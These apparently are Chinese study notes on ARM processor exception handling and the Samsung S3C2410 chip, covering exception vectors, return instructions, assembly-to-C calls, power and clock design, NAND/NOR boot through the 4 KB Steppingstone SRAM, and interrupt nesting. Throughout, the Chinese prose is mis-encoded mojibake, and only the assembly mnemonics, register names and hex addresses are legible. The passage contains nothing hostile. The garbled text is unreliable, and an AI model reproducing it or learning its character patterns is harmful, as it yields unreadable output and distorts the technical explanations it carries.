åˆå§‹åŒ–æœ‰ç‰¹æ®Šè¦æ±‚çš„å¤–å›´è®¾å¤‡ï¼Œå¦‚LEDç¯ã€çœ‹é—¨ç‹— åˆå§‹åŒ–ç”¨æˆ·çš„æ‰§è¡Œç¯å¢ƒï¼ˆåœ¨FLASHä¸­è¿è¡Œå¤ªæ…¢äº†ï¼ŒæŠŠä»£ç æ•´ä½“æ¬è¿åˆ°RAMä¸­ï¼‰ åˆ‡æ¢å¤„ç†å™¨çš„å·¥ä½œæ¨¡å¼ è°ƒç”¨ä¸»ç¨‹åº å¼‚å¸¸å¤„ç† å½“æ­£å¸¸çš„ç¨‹åºæ‰§è¡Œæµç¨‹å‘ç”Ÿæš‚æ—¶çš„åœæ­¢æ—¶ï¼Œç§°ä¹‹ä¸ºå¼‚å¸¸ã€‚å¯¹å¼‚å¸¸çš„å¤„ç†æœ‰ä¼˜å…ˆçº§ï¼Œå¤„ç†å¼‚å¸¸éœ€è¦è·³è½¬è‡³å¼‚å¸¸æ¨¡å¼ã€‚å¹¶æ ¹æ®å¼‚å¸¸å‘é‡è·³è½¬è‡³å“åº”çš„å­ç¨‹åºï¼ˆæ‰§è¡Œä¹‹å‰å¿…é¡»ä¿å­˜ç°åœºï¼‰ï¼Œå³å¼‚å¸¸å‡ºç°åå¼ºåˆ¶è·³è½¬è‡³å›ºå®šçš„å­˜å‚¨å™¨åœ°å€æ‰§è¡Œã€‚å¼‚å¸¸æ˜¯æ¯”ä¸­æ–­æ›´å¤§çš„æ¦‚å¿µã€‚\nå¼‚å¸¸å¤„ç† ARMæœ‰7ç§å¼‚å¸¸ã€‚åŒ…æ‹¬:\nå¤ä½ ç®¡ç†æ¨¡å¼ 0x00000000 è½¯ä¸­æ–­SWI ç®¡ç†æ¨¡å¼ 0x00000008 IRQ IRQæ¨¡å¼ 0x00000018 FIQ FIQæ¨¡å¼ 0x0000001c è¿˜åŒ…æ‹¬é¢„å–ä¸­æ­¢ã€æ•°æ®ä¸­æ­¢ã€æœªå®šä¹‰ å¼‚å¸¸å‡ºç°æ—¶ï¼Œå¼‚å¸¸æ¨¡å¼åˆ†ç»„çš„R14å’ŒSPSRç”¨äºä¿å­˜ä¸‹ä¸€æ¡ç¨‹åºåœ°å€å’ŒCPSRã€‚å¼‚å¸¸è¿”å›æ—¶ï¼ŒSPSR-\u0026gt;CPSRï¼ŒR14-\u0026gt;PC\nåœ¨å¯åŠ¨ä»£ç ä¸­é¦–å…ˆå°±æ˜¯è®¾ç½®æ‰€è°“çš„å¼‚å¸¸å‘é‡è¡¨ï¼Œä¹Ÿå°±æ˜¯åœ¨æŒ‡å®šçš„ä½ç½®æ”¾ç½®å¼‚å¸¸å¤„ç†ç¨‹åºï¼ˆä¸€èˆ¬æ˜¯è·³è½¬æŒ‡ä»¤ï¼‰ã€‚å¼‚å¸¸å‘ç”Ÿæ—¶ï¼ŒCPUä¼šæ ¹æ®è§„å®šå¼ºåˆ¶ç½®PCï¼Œæ°å¥½å»æ‰§è¡Œæˆ‘ä»¬è®¾ç½®å¥½çš„è·³è½¬æŒ‡ä»¤ï¼Œæ¥ç€æ‰§è¡ŒæœåŠ¡ç¨‹åºã€‚\nå¼‚å¸¸å¤„ç†æµç¨‹ï¼šï¼ˆç¡¬ä»¶æœºåˆ¶ï¼Œåªåšè¿™äº›ï¼Œè·Ÿä»£ç æ— å…³ï¼‰ æ ¹æ®å¼‚å¸¸ç±»å‹ï¼Œå¼ºåˆ¶è®¾ç½®CPSRçš„è¿è¡Œæ¨¡å¼ä½ åœ¨åˆ‡æ¢åˆ°çš„å¼‚å¸¸æ¨¡å¼ä¸‹ï¼Œåœ¨å½“å‰çš„é“¾æ¥å¯„å­˜å™¨LR(r14)ä¸­ä¿å­˜ä¸Šä¸ªæ¨¡å¼çš„PCå€¼-4ï¼Œä»¥ä¾¿ç¨‹åºåœ¨å¤„ç†å¼‚å¸¸è¿”å›æ—¶èƒ½ä»æ­£ç¡®çš„ä½ç½®é‡æ–°å¼€å§‹æ‰§è¡Œ å°†ä¸Šä¸€ä¸ªæ¨¡å¼çš„CPSRå¤åˆ¶åˆ°å½“å‰å¼‚å¸¸æ¨¡å¼çš„SPSRä¸­ï¼ˆæ³¨æ„1ä¸2ã€3çš„çŸ›ç›¾ï¼Œä¸èƒ½ç‹¬ç«‹æ‰§è¡Œï¼Œä½†æ˜¯æ˜¯ç¡¬ä»¶å®ç°çš„ï¼Œæ— å…³ä»£ç ï¼‰ å¼ºåˆ¶PCã€‚ç„¶åå°±åˆ°äº†æ‰§è¡Œä»£ç çš„æ—¶å€™ä»ç›¸å…³çš„å¼‚å¸¸å‘é‡åœ°å€å–ä¸‹ä¸€æ¡æŒ‡ä»¤æ‰§è¡Œï¼Œä»è€Œè·³è½¬åˆ°ç›¸åº”çš„å¼‚å¸¸å¤„ç†ç¨‹åºå¤„ã€‚ å¼‚å¸¸è¿”å›æµç¨‹ï¼šï¼ˆæœ‰æŒ‡ä»¤ï¼‰ å°†LRå¯„å­˜å™¨ä¸­çš„å€¼å‡å»ç›¸åº”çš„åç§»é‡(å¯¹äºIRQ/FIQæ˜¯4)é€åˆ°PCä¸­ å°† SPSR å¤åˆ¶å› CPSRï¼ˆæ³¨æ„1ä¸2çš„çŸ›ç›¾ï¼Œä¸èƒ½ç‹¬ç«‹æ‰§è¡Œï¼Œç”¨ä¸€æ¡å¸¦âˆ§çš„æŒ‡ä»¤æ‰§è¡Œï¼Œæ€ä¹ˆç€éƒ½æ˜¯ä¸€æ¡ï¼‰ æ¸…é™¤ç¦æ­¢ä¸­æ–­æ ‡å¿—,å¦‚æœå®ƒè¢«è®¾ç½®æˆä½¿èƒ½ æ‰€æœ‰ä¿®æ”¹è¿‡çš„ç”¨æˆ·å¯„å­˜å™¨å¿…é¡»ä»å¤„ç†ç¨‹åºçš„ä¿æŠ¤å †æ ˆä¸­æ¢å¤ï¼ˆå³å‡ºæ ˆï¼‰ã€‚ å¯¹ä¸­æ–­åµŒå¥—çš„å¤„ç†(æ³¨æ„)ï¼š\nä¿å­˜åœ¨LRä¸­çš„PCå€¼ï¼Œå’Œè¯¥å€¼è¿”å›æ—¶çš„å¤„ç†è¿‡ç¨‹ã€‚ å½“IRQå¼‚å¸¸ä¸­æ–­äº§ç”Ÿæ—¶ï¼Œç¨‹åºè®¡æ•°å™¨pcçš„å€¼å·²ç»æ›´æ–°ï¼Œå®ƒæŒ‡å‘å½“å‰æŒ‡ä»¤åé¢ç¬¬3æ¡æŒ‡ä»¤ï¼ˆå¯¹äºARMæŒ‡ä»¤ï¼Œå®ƒæŒ‡å‘å½“å‰æŒ‡ä»¤åœ°å€åŠ 12å­—èŠ‚çš„ä½ç½®ï¼›å½“IRQå¼‚å¸¸ä¸­æ–­äº§ç”Ÿæ—¶ï¼Œå¤„ç†å™¨å°†å€¼ï¼ˆpc-4ï¼‰ä¿å­˜åˆ°IRQå¼‚å¸¸æ¨¡å¼ä¸‹çš„å¯„å­˜å™¨lr_irqä¸­ï¼Œå®ƒæŒ‡å‘å½“å‰æŒ‡ä»¤ä¹‹åçš„ç¬¬2æ¡æŒ‡ä»¤ï¼Œå› æ­¤è¿”å›æ“ä½œå¯ä»¥é€šè¿‡ä¸‹é¢æŒ‡ä»¤å®ç°ï¼šsubs pc, lr, \\#4\næœ‰ä¸¤ç§è¿”å›æœºåˆ¶ï¼š\nå½“è¿”å›åœ°å€ä¿å­˜åœ¨å½“å‰å¼‚å¸¸æ¨¡å¼çš„r14æ—¶ä½¿ç”¨å…¶ä¸­ä¸€ç§æœºåˆ¶ å½“è¿”å›åœ°å€ä¿å­˜åœ¨å †æ ˆæ—¶ä½¿ç”¨å¦ä¸€ç§æœºåˆ¶ï¼ˆè¿›ä¸­æ–­çš„æ—¶å€™ä¿å­˜çš„ï¼‰ã€‚ è®¿é—®æœºåˆ¶ SUBS PC,R14_fiq ,\\#4 ï¼ˆä¸åŒæ¨¡å¼æœ‰ä¸åŒçš„æŒ‡ä»¤ï¼Œè¿”å›PCçš„åŒæ—¶è¿”å›CPSRï¼Œä¸€æ¡æŒ‡ä»¤å®ç°ï¼‰\nSUB LR,LR,\\#4`` STMFD R13!ï¼Œ{R0ï¼ŒR4-R12ï¼ŒLR} å°†å¯„å­˜å™¨åˆ—è¡¨ä¸­çš„å¯„å­˜å™¨R0ï¼ŒR4åˆ°R12ï¼ŒLRå­˜å…¥å †æ ˆã€‚\nLDMFD R13!,{R0ï¼ŒR4-R12ï¼ŒPC} âˆ§ å°†å †æ ˆå†…å®¹æ¢å¤åˆ°å¯„å­˜å™¨R0ï¼ŒR4åˆ°R12ï¼ŒPCï¼ŒåŒæ—¶SPSRå¤åˆ¶åˆ°CPSRã€‚{âˆ§}ä¸ºå¯é€‰åç¼€ï¼Œå½“æŒ‡ä»¤ä¸ºLDMä¸”å¯„å­˜å™¨åˆ—è¡¨ä¸­åŒ…å«R15ï¼Œé€‰ç”¨è¯¥åç¼€æ—¶è¡¨ç¤ºï¼šé™¤äº†æ­£å¸¸çš„æ•°æ®ä¼ é€ä¹‹å¤–ï¼Œè¿˜å°†SPSRå¤åˆ¶åˆ°CPSRï¼Œä¸€æ¡æŒ‡ä»¤å®ç°ã€‚\nä»£ç æŒ‡ä»¤åˆ†æï¼š\nAREA Initï¼ŒCODEï¼ŒREADONLYï¼›ä»£ç æ®µInitã€åªè¯» â€¦â€¦ CODE32 ï¼›32ä½ARMæŒ‡ä»¤é›† LDR R0ï¼Œï¼NEXTï¼‹1 ï¼›ç»™R0èµ‹åœ°å€å€¼ BX R0 ï¼›ç¨‹åºè·³ï¼Œå¹¶å°†å¤„ç†å™¨åˆ‡æ¢åˆ°Thumbå·¥ä½œçŠ¶æ€ â€¦â€¦ CODE16 ï¼› 16ä½thumbæŒ‡ä»¤é›† NEXT LDR R3ï¼Œï¼0x3FF ç»™R3èµ‹å€¼ â€¦â€¦ END é«˜çº§è¯­è¨€å’Œæ±‡ç¼–è¯­è¨€å‡½æ•°é—´çš„ç›¸äº’è°ƒç”¨: æ±‡ç¼–è°ƒç”¨Cï¼š\nIMPORT Main ;é€šçŸ¥ç¼–è¯‘å™¨è¯¥æ ‡å·ä¸ºä¸€ä¸ªå¤–éƒ¨æ ‡å· AREA Init,CODE,READONLY ï¼›å®šä¹‰ä¸€ä¸ªä»£ç æ®µ ENTRY ï¼›å®šä¹‰ç¨‹åºçš„å…¥å£ç‚¹ LDR R0,=0x3FF0000 ï¼›åˆå§‹åŒ–ç³»ç»Ÿé…ç½®å¯„å­˜å™¨ LDR R1,=0xE7FFFF80 STR R1,[R0] LDR SP,=0x3FE1000 ï¼›åˆå§‹åŒ–ç”¨æˆ·å †æ ˆ BL Main ï¼›**è·³è½¬åˆ°Mainï¼ˆï¼‰å‡½æ•°å¤„çš„C/C++ä»£ç æ‰§è¡Œ** END ï¼›**æ ‡è¯†æ±‡ç¼–ç¨‹åºçš„ç»“æŸ** ä»¥ä¸Šçš„ç¨‹åºæ®µå®Œæˆä¸€äº›ç®€å•çš„åˆå§‹åŒ–ï¼Œç„¶åè·³è½¬åˆ°Mainï¼ˆï¼‰å‡½æ•°æ‰€æ ‡è¯†çš„C/C ï¼‹ï¼‹ä»£ç å¤„æ‰§è¡Œä¸»è¦çš„ä»»åŠ¡ï¼Œæ­¤å¤„çš„Mainä»…ä¸ºä¸€ä¸ªæ ‡å·ï¼Œä¹Ÿå¯ä½¿ç”¨å…¶ä»–åç§°ã€‚ AREA Init , CODE , READONLY ;å·²å®šä¹‰ä»£ç æ®µ ENTRYï¼›ç¨‹åºå…¥å£ LDR R0, =0x3ff5000ï¼›R0èµ‹å¯„å­˜å™¨åœ°å€å€¼ LDR R1, 0xï¼›è¦ç»™å¯„å­˜å™¨èµ‹çš„å€¼ STR R1,[R0]ï¼›èµ‹å€¼ LDR R0, =0x3ff5008 LDR R1, 0x01 STR R1,[R0]ï¼›ç»™å¦ä¸€ä¸ªå¯„å­˜å™¨èµ‹å€¼çš„è¿‡ç¨‹ BL PROCï¼›è·³è½¬è‡³æ ‡å·ä¸ºPROCçš„ç¨‹åºå‡ºæ‰§è¡Œ : : : : PROC : : MOV PC, LR //å°†LRä¿å­˜çš„ç¨‹åºæŒ‡é’ˆè¿”å›ï¼Œå³**è·³åˆ°BLä¸‹ä¸€å¥æ¥ç€æ‰§è¡Œ** : : END ARM 2410è®¾è®¡ç›¸å…³ CPUã€å¤–è®¾ã€å¤–è®¾æ§åˆ¶å™¨ã€æ—¶åºã€å¯„å­˜å™¨çš„ç›¸äº’å…³ç³»ï¼Ÿ CPUä¸å¤–è®¾æ§åˆ¶å™¨æ„æˆå¾®å¤„ç†å™¨ï¼Œå¾®å¤„ç†å™¨åœ¨æ ¸å¿ƒæ¿ï¼ˆæœ€å°ç³»ç»Ÿï¼‰ä¸Šå‘æŒ¥ä½œç”¨ï¼Œå°†å¼•è„šé›†åˆæˆå¤–è®¾æ¥å£åŠ ä¸Šç”µå¹³è½¬æ¢ç­‰å°±æ˜¯å¤–å›´æ¿ï¼Œå¤–è®¾é€šè¿‡å¤–å›´æ¿è¿æ¥è‡³å¤–è®¾æ§åˆ¶å™¨ã€‚CPUé€šè¿‡å¯„å­˜å™¨ç¼–ç¨‹æ§åˆ¶å¤–è®¾æ§åˆ¶å™¨äº§ç”Ÿæ—¶åºæ§åˆ¶å¤–è®¾ã€‚è‹¥æ˜¯æ²¡æœ‰å¤–è®¾æ§åˆ¶å™¨ï¼Œåˆ™éœ€è¦CPUè‡ªå·±äº§ç”Ÿæ—¶åºæ¥ä¸å¤–è®¾äº¤äº’ï¼Œè¿™ç§æ—¶åºç›¸å½“äºä¸€ç§çº¦å®šå¥½çš„æ„æ€è¡¨ç¤ºï¼Œç›¸å½“äºâ€œè¯­è¨€â€æˆ–è€…â€œé€šä¿¡åè®®â€ï¼Œ\nä¾‹å¦‚ï¼šè‹¥æ˜¯2410ä¸ä¸€ä¸ªå¸¦æœ‰IICæ¥å£çš„å™¨ä»¶é€šä¿¡ï¼Œåªéœ€è¦è¿æ¥èµ·æ¥ï¼Œå¯¹IICè¿›è¡Œå¯„å­˜å™¨ç¼–ç¨‹ï¼Œæ§åˆ¶å®ƒä»¬ä¹‹é—´çš„å·¥ä½œæ¨¡å¼ï¼Œå¯èƒ½æ”¶å‘æ•°æ®å°±å˜æˆäº†åœ¨ä¸­æ–­ä¸­è¯»å†™å¯„å­˜å™¨æ“ä½œï¼Œå±è”½äº†IICè§„å®šçš„é€šä¿¡ç»†èŠ‚ã€‚è‹¥æ˜¯51å•ç‰‡æœºè¦ä¸IICé€šä¿¡çš„è¯ï¼Œå°±å¤æ‚å¤šäº†ï¼Œé¦–å…ˆè¦ä»”ç»†é˜…è¯»IICçš„åè®®ï¼Œä¸å®¹ä¸æ¯«å·®é”™ï¼Œç„¶åç”¨IOå£æ¨¡æ‹Ÿæ—¶åºï¼ŒCPUçš„å·¥ä½œé‡å¾ˆå¤§ã€‚\nå¯„å­˜å™¨ç¼–ç¨‹çš„æœ¬è´¨ï¼Ÿå¦‚ä½•è·å–å¯„å­˜å™¨çš„é…ç½®ï¼Ÿ å¯„å­˜å™¨ç¼–ç¨‹çš„æœ¬è´¨æ˜¯CPUæ§åˆ¶å¤–è®¾å¯„å­˜å™¨å·¥ä½œæ¨¡å¼çš„æ–¹æ³•ã€‚å¯ä»¥æƒ³è±¡å¯„å­˜å™¨çš„æ¯ä¸€ä½è‚¯å®šæ˜¯å¤–è®¾æ§åˆ¶å™¨åŠŸèƒ½æ¨¡å—ä¸­çš„ä¸€ä¸ªä¸ªâ€œå¼€å…³â€ï¼Œç»™æŸä¸€ä½èµ‹å€¼0æˆ–è€…1ï¼Œå°±ç›¸å½“äºä½¿èƒ½æˆ–å…³é—­æŸä¸€ä¸ªåŠŸèƒ½ã€‚\n2410æœ€å°ç”µè·¯è®¾è®¡ï¼Ÿï¼ˆæ™¶æŒ¯é€‰æ‹©ã€å¯åŠ¨é€‰æ‹©ã€æ•°æ®å®½åº¦ï¼‰ ä¸ä¸€èˆ¬çš„ARMç³»ç»Ÿç›¸åŒï¼Œéƒ½éœ€è¦å¾®å¤„ç†å™¨ã€ç”µæºã€æ™¶æŒ¯ã€å¤ä½ã€å­˜å‚¨å™¨ï¼ˆflashã€SDRAMï¼‰ã€JTAGæ¥å£ç­‰ï¼Œå…·ä½“æƒ…å†µå¦‚ä¸‹ï¼šï¼ˆéœ€è¦å¯¹OM0å’ŒOM1é…ç½®ç”µå¹³ä»¥å†³å®šå¯åŠ¨æ–¹å¼ï¼Œå¯¹OM2å’ŒOM3é…ç½®ç”µå¹³ä»¥å†³å®šæ—¶é’Ÿæºã€‚ï¼‰\nç”µæºè®¾è®¡ï¼šå¤„ç†å™¨ç”¨1.8Vï¼ŒRTCç»™æ—¶é’Ÿæ¨¡å—ä¾›ç”µ1.8Vï¼Œå­˜å‚¨å™¨å’Œæ™®é€šIOç”¨3.3Vï¼ŒADCæ¨¡å—ç”¨3.3Vï¼Œå¯è§æœ€å°ç³»ç»Ÿæœ€å°‘è¦ç”¨3.3å’Œ1.8ä¸¤ç§ç›´æµç¨³å‹ã€‚è¯¾ç¨‹å®éªŒä¸­ç”µæºç”µå‹5Vï¼Œåˆ†åˆ«ç”¨LM1085ç¨³å‹3.3Vï¼Œç”¨AS1117ç¨³å‹1.8Vã€‚ æ™¶æŒ¯è®¾è®¡: 2410çš„æ—¶é’Ÿæ§åˆ¶é€»è¾‘å¯ä»¥äº§ç”Ÿç³»ç»Ÿæ‰€éœ€è¦çš„æ—¶é’Ÿï¼ŒåŒ…æ‹¬CPUçš„FCLKï¼Œå’ŒAHBæ€»çº¿çš„HCLKï¼ŒAPBçš„PCLKã€‚å†…éƒ¨æœ‰ä¸¤ä¸ªé”ç›¸ç¯PLLï¼ŒMPLLæä¾›å‰ä¸‰ä¸ªï¼ŒUPLLç»™USBæä¾›48MHZçš„æ—¶é’Ÿã€‚ ä¸»æ—¶é’Ÿæºï¼ˆUPLLå’ŒMPLLçš„æ—¶é’Ÿæºï¼‰å¯ä»¥é€‰æ‹©æ˜¯æ¥è‡ªå¤–éƒ¨æ—¶é’Ÿè¿˜æ˜¯å¤–éƒ¨æ™¶æŒ¯ï¼Œè¿™æ˜¯ç”±OM2å’ŒOM3çš„ç®¡è„šç¡®å®šçš„ï¼Œå¯ä»¥OM2å’ŒOM3åŒæ—¶æ¥ä½ç”µå¹³ï¼Œé€‰æ‹©å¤–éƒ¨æ™¶æŒ¯ï¼Œæ™¶æŒ¯åŠ ä¸Š15pFèµ·æŒ¯ç”µå®¹ï¼ˆç»è¿‡é”ç›¸ç¯å€é¢‘å¯ä»¥è¾¾åˆ°ï¼‰ã€‚ å¤ä½ç”µè·¯è®¾è®¡:å¯ä»¥åœ¨nRESETç«¯è®¾è®¡åƒ51å•ç‰‡æœºé‚£æ ·çš„é˜»å®¹å¤ä½ç”µè·¯ï¼Œä½†ä¸ºäº†ç¨³å®šï¼Œå¯ä»¥ä½¿ç”¨å¤ä½èŠ¯ç‰‡å¦‚MAX811æˆ–IMP811ã€‚ JTAGæ¥å£è®¾è®¡: æœ‰20é’ˆå’Œ14é’ˆä¸¤ç§JTAGæ¥å£ã€‚ å­˜å‚¨å™¨è®¾è®¡: 2410æœ‰è‡ªå·±çš„å­˜å‚¨å™¨æ§åˆ¶å™¨ï¼Œå¹¶ä¸”è§„å®šäº†å“ªäº›bankç©ºé—´æ˜¯RAMå“ªäº›æ˜¯FLASHï¼Œå­˜å‚¨å™¨èŠ¯ç‰‡ä¸¥æ ¼æŒ‰ç…§DATASHEETä¸Šçš„è¦æ±‚å’Œæ ‡æ˜çš„å¼•è„šè¿æ¥æ–¹å¼ä¸å­˜å‚¨å™¨æ§åˆ¶å™¨çš„å­˜å‚¨å™¨æ¥å£ç›¸è¿å°±å¯ä»¥ï¼Œæ§åˆ¶å™¨ä¼šæ ¹æ®åœ°å€äº§ç”Ÿè¯»å†™å­˜å‚¨å™¨èŠ¯ç‰‡çš„æ—¶åºï¼Œå®Œæˆå­˜å–æ•°æ®çš„æ“ä½œã€‚ 2410norå’Œnandå¯åŠ¨è¿‡ç¨‹åˆ†æï¼Ÿ NOR flash:è¯»å–é€Ÿåº¦é«˜ã€è€Œæ“¦å†™é€Ÿåº¦ä½ï¼Œå®¹é‡å°ï¼Œä»·æ ¼é«˜ï¼Œåœ°å€çº¿å’Œæ•°æ®çº¿åˆ†å¼€ï¼Œé‡‡ç”¨SRAMæ¥å£ã€‚ NAND flash:è¯»é€Ÿåº¦ä¸å¦‚NORflash ä½†æ˜¯æ“¦å†™é€Ÿåº¦é«˜ï¼Œå®¹é‡å¤§ï¼Œä»·æ ¼ä½ï¼Œæœ‰å–ä»£ç¡¬ç›˜çš„è¶‹åŠ¿ï¼Œä½†æ˜¯åœ°å€çº¿å’Œæ•°æ®å¤ç”¨ï¼Œéœ€è¦ç¨‹åºé…åˆæ‰èƒ½è¯»å†™æ•°æ®ã€‚å¯ä»¥é€šè¿‡è·³çº¿è®¾ç½®æ—¶ä»NAND FLASHå¯åŠ¨è¿˜æ˜¯ä»NOR FLASHå¯åŠ¨ã€‚\nNANDå¯åŠ¨çš„ä¼˜åŠ¿ï¼šä¾¿å®œã€å®¹é‡å¤§ã€‚ä½†æ˜¯è¯»å†™é€»è¾‘ä¸èƒ½ç”¨ç¡¬ä»¶äº§ç”Ÿï¼Œä¹Ÿå°±æ˜¯æ²¡åŠæ³•æ¥åˆ°BANKç©ºé—´é‡Œï¼Œå¿…é¡»æœ‰ç¨‹åºé…åˆæ‰èƒ½è¯»å†™ï¼ˆæœ‰ä¸“é—¨çš„æ§åˆ¶å™¨æ¥å£ï¼Œè‚¯å®šè¦å¯„å­˜å™¨ç¼–ç¨‹åŠ ä¸Šç¨‹åºé…åˆæ‰èƒ½è¯»å†™ï¼Œæ²¡æœ‰PCçš„æ ¹æ­£è‹—çº¢ï¼‰ï¼Œæ‰€ä»¥ç†è®ºä¸Šå®ƒæ˜¯ä¸å¯ä»¥ç”¨æ¥å¯åŠ¨ç³»ç»Ÿçš„ï¼Œå› ä¸ºé‚£ä¹‹å‰ä»€ä¹ˆç¨‹åºéƒ½æ²¡æœ‰ï¼Œè¦æƒ³è¯»å†™å®ƒå¿…é¡»æ˜¯ç³»ç»Ÿè£…è½½å®Œäº†è€Œä¸”æœ‰ç¨‹åºäº†ã€‚ä½†æ˜¯ä¸‰æ˜Ÿé‡‡ç”¨äº†SRAMæ˜ å°„è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œä¸‹é¢å°±æ˜¯è¿™ä¸ªè¿‡ç¨‹ï¼š\nç”µè·¯ä¸­ä½¿OM1å’ŒOM0éƒ½æ¥ä½ç”µå¹³ï¼Œä»NAND FLASHä¸­å¯åŠ¨ã€‚ï¼ˆ2410æœ‰NAND FLASHæ§åˆ¶å™¨ï¼Œè¿æ¥NAND FlashèŠ¯ç‰‡ï¼Œäº§ç”Ÿè¯»å†™æ—¶åºï¼‰\nåœ¨è¯¥æ¨¡å¼ä¸‹ï¼Œ2410çš„å‰4KBåœ°å€ç©ºé—´å¯¹åº”ä¸€ä¸ªåå­—å«åšâ€œèµ·æ­¥çŸ³â€çš„SRAMï¼Œç³»ç»Ÿå¯åŠ¨æ—¶ï¼Œè‡ªåŠ¨å°†NAND FLASHçš„å‰4KBæ•°æ®åŠ è½½åˆ°èµ·æ­¥çŸ³ä¸­ï¼Œç„¶åç³»ç»Ÿè‡ªåŠ¨æ‰§è¡Œè¿™äº›å¯åŠ¨å¼•å¯¼ä»£ç ï¼ŒCPUä»å†…éƒ¨RAMçš„0x00000000ä½ç½®å¼€å§‹å¯åŠ¨ã€‚è¿™ä¸ªè¿‡ç¨‹ä¸éœ€è¦ç¨‹åºå¹²æ¶‰ã€‚ä¹Ÿå°±æ˜¯ç±»ä¼¼äºSTARTUP.Sçš„åŠŸèƒ½ï¼Œåˆå§‹åŒ–å¼‚å¸¸å‘é‡è¡¨ã€å †æ ˆã€å°†NAND FLASHä¸­çš„ä»£ç (æœ‰ä»£ç æ”¯æŒå–½)æ‹·è´åˆ°SDRAMä¸­è¿è¡Œã€‚\nNOR FLASH é‡‡ç”¨çš„çš„æ˜¯SRAMæ¥å£ï¼Œå¯ä»¥ç›´æ¥åˆ°å­˜å‚¨å™¨æ§åˆ¶å™¨ä¸Šï¼ŒARMå†…æ ¸äº§ç”Ÿçš„æ—¶åºèƒ½å¯¹å…¶è¯»å†™ã€‚å°†bank0ä¸Šæ¥ä¸ŠNORflashèŠ¯ç‰‡ã€‚ä¸Šç”µäº§ç”Ÿå¤ä½å¼‚å¸¸åä¼šè‡ªåŠ¨ä»NOR flashä¸­å¯åŠ¨ã€‚\n2410çš„ä¸­æ–­å¤„ç†æµç¨‹ï¼Ÿ é¦–å…ˆåº”è¯¥æ˜ç¡®2410ä¸ARMå†…æ ¸çš„å¼‚å¸¸å¤„ç†ç³»ç»Ÿçš„è§’è‰²ï¼Œæ ¹æ®ä¹‹å‰çš„ARMå¼‚å¸¸å¤„ç†æµç¨‹ï¼Œæˆ‘ä»¬æ¸…æ¥šæ˜äº†äº†å“ªäº›æ˜¯CPUçš„ç¡¬ä»¶æœºåˆ¶ã€‚2410é€šè¿‡ä¸­æ–­æ§åˆ¶å™¨å…è®¸ä»¥ä¼˜å…ˆçº§çš„æ–¹å¼å°†å‡ åä¸ªä¸­æ–­æºå…±åŒç”¨ä¸€ä¸ªIRQã€‚ä¸€ä¸ªä¸­æ–­ç”³è¯·æå‡ºåï¼ŒIRQå¼‚å¸¸å‘ç”Ÿï¼Œåˆ‡æ¢æ¨¡å¼ã€ä¿å­˜CPSRã€ä¿å­˜PCï¼Œç„¶åè·³è½¬åˆ°handleIRQå‡½æ•°ï¼Œç„¶åè·³è½¬åˆ°ISRIRQ(è¿™åªæ˜¯ä¸€ä¸ªå¤§æ¦‚æµç¨‹ï¼Œä¹Ÿè®¸ä¼šå®šä¹‰æ›´å¤šçš„è·³è½¬)æ ¹æ®ä¸­æ–­æºå‘é‡è¡¨çš„é¦–åœ°å€å’Œåç§»é‡å¯„å­˜å™¨æ‰¾å‡ºåˆ°åº•æ˜¯å“ªä¸ªä¸­æ–­å‘ç”Ÿäº†ã€‚ç„¶åè·³è½¬åˆ°ç›¸åº”çš„ä¸­æ–­å¤„ç†å‡½æ•°ï¼Œæ¯”å¦‚è·³åˆ°ä¸²å£ä¸­æ–­ï¼Œè¿˜å¯ä»¥æ ¹æ®æŒ‚èµ·ä½ï¼ˆå³ä¸­æ–­æ ‡å¿—ä½ï¼‰å†æ¬¡åˆ¤æ–­åˆ°åº•æ˜¯æ¥æ”¶ä¸­æ–­è¿˜æ˜¯å‘é€å®Œæˆä¸­æ–­ã€‚ä¹Ÿå°±æ˜¯è¯´2410å¤„ç†æµç¨‹é™¤äº†ARMå¯¹å¼‚å¸¸çš„å“åº”æ˜¯ç¡¬ä»¶æœºåˆ¶å¤–ï¼Œå…¶ä½™çš„éƒ½æ˜¯ä»£ç å®ç°çš„ã€‚æˆ‘ä»¬åœ¨ç¼–ç¨‹çš„æ—¶å€™æ²¡æœ‰å†™çš„è¯ï¼Œé‚£ä¹Ÿæ˜¯ç¼–è¯‘å™¨åŠ è¿›å»çš„ã€‚\n2410å¯¹åµŒå¥—çš„å¤„ç† æ¯”èµ·2410çš„å¤„ç†æµç¨‹ä¸åŒçš„æ˜¯ï¼Œå› ä¸ºæœ‰äº†ä¸­æ–­æ§åˆ¶å™¨ï¼Œè¿™å°±æ˜¯å®ç°é«˜ä¼˜å…ˆçº§åµŒå¥—çš„ç¡¬ä»¶åŸºç¡€ï¼Œå› ä¸ºæ¯ä¸€æ¬¡è¿›å…¥å¼‚å¸¸æ¨¡å¼ç”¨æˆ·éƒ½ä¼šä¿å­˜ç¯å¢ƒï¼Œè¿™å°±æ˜¯ä¸­æ–­åµŒå¥—çš„è½¯ä»¶åŸºç¡€ã€‚CPUçš„å¼‚å¸¸å¤„ç†æœºåˆ¶æ€»æ˜¯é‚£äº›ï¼Œå¾ˆæ˜ç¡®çš„ã€‚æˆ‘æ­£åœ¨æ‰§è¡Œä¸€ä¸ªä¸­æ–­æœåŠ¡ç¨‹åºï¼Œç„¶åå†æ¬¡å‘ç”Ÿå¼‚å¸¸ï¼Œä¿å­˜ï¼Œè·³è½¬ï¼ˆCPUï¼‰ã€å†æ¬¡åˆ¤æ–­æ˜¯å“ªä¸ªä¸­æ–­ï¼Œè¿›å»ä¹‹åå‹æ ˆï¼Œè¿è¡Œå¦ä¸€ä¸ªä¸­æ–­çš„æœåŠ¡ç¨‹åºï¼Œè¿è¡Œå®Œè¿”å›ï¼Œè¿™æ˜¯å°±æ˜¯è¿”å›åˆ°ä¸Šä¸€ä¸ªä¸­æ–­äº†ã€‚ä¸Šä¸€ä¸ªä¸­æ–­è¿è¡Œå®Œï¼Œä¸€è¿”å›å°±æ˜¯è¿”å›å‘ç”Ÿå¼‚å¸¸å‰çš„çŠ¶æ€ã€‚\nS3C2410çš„ä¸²å£ã€ç«¯å£ã€å¤–éƒ¨ä¸­æ–­ã€ADç­‰åŠå¯„å­˜å™¨çš„ç¼–ç¨‹èƒ½åŠ›ï¼ˆä¼šè¯»datasheetã€ä¼šç¼–ç¨‹ã€ä½œä¸šã€å®éªŒçš„ç›¸å…³ä»£ç ï¼‰ å¯„å­˜å™¨çš„èµ‹å€¼æŒ‡ä»¤\nLDR R0ï¼Œ=GPHCON LDR R1,=0X2AFAAA STR R1ï¼Œ[R0] æ—¶é’Ÿã€çœ‹é—¨ç‹—çš„ç›¸å…³æ¦‚å¿µ æ—¶é’Ÿ: 